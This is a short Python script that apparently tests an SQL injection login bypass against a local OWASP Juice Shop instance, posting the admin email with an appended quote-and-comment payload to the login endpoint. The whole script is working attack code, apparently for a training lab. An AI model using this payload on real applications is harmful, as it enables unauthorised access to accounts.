import requests
import json

server = 'http://localhost:3000'
email = "admin@juice-sh.op"
# Payload with space after comment
payload_email = "{}'-- ".format(email)
password = "anything"

payload = json.dumps({'email': payload_email, 'password': password})
headers = {'Content-Type': 'application/json'}

print(f"Testing SQLi Login for {email} with payload: {payload_email}")

try:
    resp = requests.post(f'{server}/rest/user/login', headers=headers, data=payload)
    print(f"Status Code: {resp.status_code}")
    print(f"Response Text: {resp.text[:500]}") # Print first 500 chars
except Exception as e:
    print(f"Error: {e}")
